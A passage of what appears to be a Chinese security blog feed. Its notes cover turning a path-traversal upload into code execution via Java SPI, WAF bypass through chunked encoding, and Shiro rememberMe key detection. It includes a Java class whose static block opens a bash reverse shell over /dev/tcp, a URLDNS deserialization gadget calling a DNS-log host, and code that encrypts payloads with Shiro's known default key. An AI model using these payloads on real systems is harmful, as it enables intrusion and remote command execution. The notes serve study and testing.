class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.firebasky.spi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> java.util.ServiceLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpiTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            init();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span>&#123;</span><br><span class="line">        ServiceLoader&lt;SpiService&gt; serviceLoader = ServiceLoader.load(SpiService.class);</span><br><span class="line">        Iterator&lt;SpiService&gt; iterator = serviceLoader.iterator();</span><br><span class="line">        <span class="keyword">while</span> (iterator.hasNext()) &#123;</span><br><span class="line">            <span class="type">SpiService</span> <span class="variable">spiService</span> <span class="operator">=</span> iterator.next();</span><br><span class="line">            spiService.hello();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后定义META-INF/services<br><img src="https://user-images.githubusercontent.com/63966847/146678546-94e017c7-15a4-41f3-8082-4a0083c9b903.png" alt="image-20211219220826826"></p><p>然后run之后会输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SpiServiceA.Hello</span><br><span class="line">SpiServiceB.Hello</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>也就是我们可以通过spi机制去获得实现接口的类并且实例化去调用方法。</p><p>调用<strong>next方法</strong>的时候，实际调用到的是，lookupIterator.nextService。它通过反射的方式，创建实现类的实例并返回。</p><p><img src="https://user-images.githubusercontent.com/63966847/146678550-d158915b-fd15-4b20-a588-063ed76e7f8c.png" alt="image-20211219221208548"></p><p><img src="https://user-images.githubusercontent.com/63966847/146678553-aede21be-261d-4077-9f21-a5ca8d60c4ec.png" alt="image-20211219221324358"></p><p>需要注意一点如何获得 <strong>cn</strong>这个变量勒，也就是spi实例化什么东西？这个其实是在 <strong>META-INF/services/com.firebasky.spi.SpiService</strong>中配置的。</p><h2 id="新思路"><a href="#新思路" class="headerlink" title="新思路"></a>新思路</h2><p>那问题来了？</p><p><strong>环境存在路径穿越上传文件会造成rce?</strong> 会的。</p><p>如何实现？</p><p>我们上传META-INF/services/com.firebasky.spi.SpiService文件并且覆盖其中的值，写入我们的恶意类的全类名比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.firebasky.spi.evil</span><br></pre></td></tr></table></figure><p>然后我们在target\classes\下上传我们的evil.class，然后让其在一次的执行spi的操作。就可以成功rce.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#evil.java</span><br><span class="line"><span class="keyword">package</span> com.firebasky.spi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">evial</span> <span class="keyword">implements</span> <span class="title class_">SpiService</span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>&#125;);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">            &#125;<span class="keyword">catch</span> (IOException ee)&#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">()</span> &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译成class 之后上传到target\classes\</p><p><img src="https://user-images.githubusercontent.com/63966847/146678561-9958bc94-f179-4440-97c4-fbdd2f7e03de.png" alt="image-20211219222014485"></p><p>在覆盖META-INF/services/com.firebasky.spi.SpiService</p><p><img src="https://user-images.githubusercontent.com/63966847/146678565-b5a349de-0fa3-4285-ae4c-3ce8a893bae7.png" alt="image-20211219222049642"></p><p>之后执行一下SpiTest。<br><img src="https://user-images.githubusercontent.com/63966847/146678572-60f7cfe5-32cf-4a40-9cca-b4a9d452d966.png" alt="image-20211219222131132"></p><p>其实也不是什么新思路,很多大师傅在实现写文件rce的时候就用到了,说不定ctf中可能遇到？？？</p><blockquote><p>参考： </p><p><a href="https://www.cnblogs.com/xrq730/p/11440174.html">https://www.cnblogs.com/xrq730/p/11440174.html</a></p><p><a href="https://www.jianshu.com/p/3a3edbcd8f24">https://www.jianshu.com/p/3a3edbcd8f24</a></p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat源码调试</title>
      <link href="/2022/11/10/Tomcat%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95/"/>
      <url>/2022/11/10/Tomcat%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id="Tomcat源码调试"><a href="#Tomcat源码调试" class="headerlink" title="Tomcat源码调试"></a>Tomcat源码调试</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>后面的很多漏洞环境在调试的时候都需要步入 Tomcat 源码文件里，在步入的 class 反编译文件观感不佳（例如变量名丢失，变成了 var 1,2,3…诸如此类）。所以这里写篇笔记记录一下自己的配置过程和遇到的问题的解决方案（自己瞎鼓捣的，并非最好的解决方案），如果其他师傅有比较好的配置方法，欢迎分享学习学习。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>因为我的 Tomcat 版本是 9.0.65，所以我在官方下载的也是该版本的源码压缩包<br><img src="images/image-20221102104218124.png" alt="image-20221102104218124"></p><p>解压如下<br><img src="images/image-20221102104341694.png" alt="image-20221102104341694"></p><p>把 java 文件夹里的 javax 和 org 两个文件夹复制到创建的 Java 项目中<br><img src="images/image-20221102104454294.png" alt="image-20221102104454294"></p><p>在 pom.xml 里添加如下的 maven 依赖：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- tomcat source--&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;biz.aQute.bnd&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;biz.aQute.bndlib&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;5.2.0&lt;/version&gt;</span><br><span class="line">    &lt;scope&gt;provided&lt;/scope&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.ant&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;ant&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.9.7&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;wsdl4j&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;wsdl4j&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.6.2&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;javax.xml&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;jaxrpc&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.1&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.eclipse.jdt.core.compiler&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;ecj&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;4.5.1&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure></p><p>接下来就是设置字节码版本（以自己的 JDK 版本为准），我的是 jdk 1.8，故配置如下：</p><p>项目结构-模块<br><img src="images/image-20221102105319386.png" alt="image-20221102105319386"></p><p>偏好设置-构建运行部署-编译器-Java 编译器<br><img src="images/image-20221102105407398.png" alt="image-20221102105407398"></p><p>运行 Java 项目，可能会遇见如下错误；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java: 找不到符号</span><br><span class="line">  符号:   变量 VERSION_9</span><br><span class="line">  位置: 类 org.eclipse.jdt.internal.compiler.impl.CompilerOptions</span><br></pre></td></tr></table></figure><p><img src="images/image-20221102104846234.png" alt="image-20221102104846234"></p><p>个人理解该报错原因是我的 JDK 版本为1.8，所以没有后面的符号变量（非准确说法，勿信），我的解决方案是把这些所有报错的红色变量都改为：<code>VERSION_1_8</code>，也可以注释掉<br><img src="images/image-20221102105557452.png" alt="image-20221102105557452"></p><p>现在项目可以正常运行了，调试情况如下：<br><img src="images/image-20221102105700077.png" alt="image-20221102105700077"></p><p>可以看到调用栈上关于 Tomcat 的部分，都有明显的颜色区分，步入进去是 java 源文件，而非 class 反编译的文件<br><img src="images/image-20221102105714779.png" alt="image-20221102105714779"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Thinking_in_java高级volatile</title>
      <link href="/2022/11/10/Thinking_in_java%E9%AB%98%E7%BA%A7%E4%B9%8Bvolatile/"/>
      <url>/2022/11/10/Thinking_in_java%E9%AB%98%E7%BA%A7%E4%B9%8Bvolatile/</url>
      
        <content type="html"><![CDATA[<p><a href="https://muxiaobai.github.io/2019/10/12/Thinking-in-java-%E9%AB%98%E7%BA%A7%E4%B9%8Bvolatile/">https://muxiaobai.github.io/2019/10/12/Thinking-in-java-%E9%AB%98%E7%BA%A7%E4%B9%8Bvolatile/</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>chunked-coding-converter</title>
      <link href="/2022/11/10/chunked-coding-converter/"/>
      <url>/2022/11/10/chunked-coding-converter/</url>
      
        <content type="html"><![CDATA[<h1 id="chunked-coding-converter"><a href="#chunked-coding-converter" class="headerlink" title="chunked-coding-converter"></a>chunked-coding-converter</h1><p><a href="https://mp.weixin.qq.com/s/pM1ULCqNdQwSB7hcltrbtw">唯快不破的分块传输绕WAF</a></p><p><a href="https://mp.weixin.qq.com/s/2DDYyvsZ5HIQC0qGMK9znQ">Bypass WAF HTTP协议覆盖+分块传输组合绕过</a></p><p><a href="https://mp.weixin.qq.com/s/eDiiiVX4oF0LYG3Ia5P4mw">利用分块传输吊打所有WAF</a></p><p><a href="https://www.freebuf.com/news/193659.html">技术讨论 | 在HTTP协议层面绕过WAF</a></p><p><a href="https://gv7.me/articles/2019/chunked-coding-converter/">编写Burp分块传输插件绕WAF</a></p><p><a href="https://gv7.me/articles/2021/java-deserialized-data-bypasses-waf-through-sleep-chunked/">Java反序列化数据绕WAF之延时分块传输</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">只有HTTP/1.1支持分块传输</span><br><span class="line">POST包都支持分块，不局限仅仅于反序列化和上传包</span><br><span class="line">Transfer-Encoding: chunked大小写不敏感</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> obsidian hexo </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Shiro之key的检测</title>
      <link href="/2022/11/10/shiro%E4%B9%8Bkey%E7%9A%84%E6%A3%80%E6%B5%8B/"/>
      <url>/2022/11/10/shiro%E4%B9%8Bkey%E7%9A%84%E6%A3%80%E6%B5%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="Shiro之key的检测"><a href="#Shiro之key的检测" class="headerlink" title="Shiro之key的检测"></a>Shiro之key的检测</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在说 key 的检测之前，先聊聊现在工具普遍用到的 key 吧。相信在了解 shiro 之前，大家都曾用过网上公开的 shiro 利用工具，其中对于 key 的检测，普遍采用的字典的形式进行爆破，这里列举几个在字典中存在的 key：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kPH+bIxk5D2deZiIxcaaaA==</span><br><span class="line">2AvVhdsgUs0FSA3SDFAdag==</span><br><span class="line">3AvVhmFLUs0KTA3Kprsdag==</span><br><span class="line">4AvVhmFLUs0KTA3Kprsdag==</span><br><span class="line">5aaC5qKm5oqA5pyvAAAAAA==</span><br><span class="line">6ZmI6I2j5Y+R5aSn5ZOlAA==</span><br><span class="line">......</span><br></pre></td></tr></table></figure></p><p>第一个大家应该都眼熟了，是 1.2.4 版本的默认 CipherKey，那其他 CipherKey 是哪里来的呢？网上有几种观点：</p><ul><li>一个框架配置了某一个 Shiro CipherKey，大家写的项目都用到了该框架；</li><li>大家的项目互相抄来抄去，对于 CipherKey 并未修改；</li><li>见到其他项目使用该 CipherKey，也沿袭着使用了；</li><li>……</li></ul><p>我们尝试在 github 上搜索其中一个 CipherKey 试试<br><img src="images/image-20221023221126506.png" alt="image-20221023221126506"></p><p>发现大部分项目都是使用了同一个 CipherKey，缘，妙不可言~</p><p>言归正传，说回 Key 的检测，第一想法都是用 URLDNS 这条链子来进行检测。但实战环境中，很多时候遇上的主机都是不出网，这种情况如何解决呢？</p><p>L1NK3R 师傅提出的只依赖于 Shiro 本身，在 CipherKey 检测正确时不返回 deleteMe，错误情况时返回 deleteMe 的方法，解决了上述不出网的情况。下面就逐个进行学习一下。</p><h2 id="基于URLDNS的检测方法"><a href="#基于URLDNS的检测方法" class="headerlink" title="基于URLDNS的检测方法"></a>基于URLDNS的检测方法</h2><p>通过前面的学习，听到该方法名字应该都已经懂如何构造了，先通过学习的 URLDNS 链生成文件<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/18 22:43</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">URLDNS</span> <span class="variable">urldns</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLDNS</span>();</span><br><span class="line">        urldns.serialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://851bdcd2.dns.1433.eu.org&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashCode</span> <span class="operator">=</span> cls.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashCode.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashCode.set(url, <span class="number">666</span>);</span><br><span class="line">        map.put(url, <span class="string">&quot;dotast&quot;</span>);</span><br><span class="line">        hashCode.set(url, -<span class="number">1</span>);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(map);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>再通过 Shiro 的<code>AesCipherService()</code>方法对前面生成的文件进行 AES 加密得到 payload<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shiro;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xerces.internal.impl.dv.util.Base64;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/10 10:45</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shiro550</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;1.txt&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] key = Base64.decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line">        <span class="type">AesCipherService</span> <span class="variable">aes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">ciphertext</span> <span class="operator">=</span> aes.encrypt(getBytes(path), key);</span><br><span class="line">        System.out.printf(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getBytes(String path) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(path);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ((n=inputStream.read())!=-<span class="number">1</span>)&#123;</span><br><span class="line">            byteArrayOutputStream.write(n);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">byte</span>[] bytes = byteArrayOutputStream.toByteArray();</span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>添加到 rememberMe 字段发送 payload<br><img src="images/image-20221024055133461.png" alt="image-20221024055133461"></p><p>最后执行反序列化流程，执行 URLDNS 链，发起 DNS 请求，打开平台看到已经收到了请求数据。<br><img src="images/image-20221024055148343.png" alt="image-20221024055148343"></p><h2 id="基于Shiro本身的检测方法"><a href="#基于Shiro本身的检测方法" class="headerlink" title="基于Shiro本身的检测方法"></a>基于Shiro本身的检测方法</h2><p>经过测试我们可以看到，在登录后携带正常的 rememberMe 发送请求并不会在返回包中存在<code>rememberMe=deleteMe</code>，但使用正确或者错误的 CipherKey 加密构造的 rememberMe 在发送请求后，都会在返回包中看到<code>rememberMe=deleteMe</code>的响应头。</p><p>那么如果我们能够使正确的 CipherKey 加密的 payload 执行后不回显<code>deleteMe</code>，错误的 CipherKey 加密的则回显<code>deleteMe</code>，那就能达到检测 CipherKey 是否正确的目的。</p><p>接下来的任务就是看看 CipherKey 正确和错误的情况下，流程是怎么走的，进行对比和分析。</p><h3 id="密钥错误"><a href="#密钥错误" class="headerlink" title="密钥错误"></a>密钥错误</h3><p>我们把断点打在最后的<code>AbstractRememberMeManager#deserialize()</code>方法处，然后用一个错误的 CipherKey 加密 URLDNS 的链子，发送请求<br><img src="images/image-20221024045034551.png" alt="image-20221024045034551"></p><p>接在跟进<code>decrypt()</code>方法直到<code>crypt()</code>方法<br><img src="images/image-20221024045303583.png" alt="image-20221024045303583"></p><p>在这里开始因为 CipherKey 错误抛出异常，在<code>getRememberedPrincipals()</code>方法中被捕获异常<br><img src="images/image-20221024045432663.png" alt="image-20221024045432663"></p><p>这里调用到了<code>onRememberedPrincipalFailure()</code>方法，跟进该方法<br><img src="images/image-20221024045929862.png" alt="image-20221024045929862"></p><p>接着调用了<code>forgetIdentity()</code>方法<br><img src="images/image-20221024050022401.png" alt="image-20221024050022401"></p><p>继续跟进<code>forgetIdentity(request, response)</code>方法<br><img src="images/image-20221024050046499.png" alt="image-20221024050046499"></p><p>调用到了<code>removeFrom()</code>方法，继续跟进<code>removeFrom()</code>方法<br><img src="images/image-20221024050136826.png" alt="image-20221024050136826"></p><p>可以看到，在该方法中定义了<code>deleteMe</code>字段并添加到响应头中</p><h3 id="密钥正确"><a href="#密钥正确" class="headerlink" title="密钥正确"></a>密钥正确</h3><p>因为 CipherKey 正确，所以这里进入了<code>doFinal()</code>方法，不会抛出异常<br><img src="images/image-20221024050454922.png" alt="image-20221024050454922"></p><p>然后一层层返回，最后到了 <code>return this.deserialize()</code>方法<br><img src="images/image-20221024050745000.png" alt="image-20221024050745000"></p><p>跟进<code>deserialize()</code>方法<br><img src="images/image-20221024050817471.png" alt="image-20221024050817471"></p><p>这里可以看到最后套了一层<code>(PrincipalCollection)</code>将返回的类转换成<code>PrincipalCollection</code>类，但转换失败，被<code>getRememberedPrincipals()</code>捕获了异常<br><img src="images/image-20221024051026334.png" alt="image-20221024051026334"></p><p>接下来就是跟前面一样进入到了<code>removeFrom()</code>方法<br><img src="images/image-20221024051128859.png" alt="image-20221024051128859"></p><p>至此，弄懂了 CipherKey 无论正确与否，进行加密的链子都会返回<code>deleteMe</code>的原因。</p><h3 id="编写POC"><a href="#编写POC" class="headerlink" title="编写POC"></a>编写POC</h3><p>既然在 CipherKey 正确情况下，是因为类型强转导致的进入<code>removeFrom()</code>方法，那么我们只要将序列化的对象继承于<code>PrincipalCollection</code>类即可，那就找一下<code>PrincipalCollection</code>类的实现类<img src="images/image-20221024051738473.png" alt="image-20221024051738473"></p><p>这里选择<code>SimplePrincipalCollection</code>类或者<code>SimplePrincipalMap</code>类都可以</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shiro;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xerces.internal.impl.dv.util.Base64;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.subject.SimplePrincipalCollection;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/10 10:45</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shiro550</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">SimplePrincipalCollection</span> <span class="variable">simplePrincipalCollection</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimplePrincipalCollection</span>();</span><br><span class="line">        <span class="type">byte</span>[] key = Base64.decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line">        <span class="type">AesCipherService</span> <span class="variable">aes</span> <span class="operator">=</span> <span 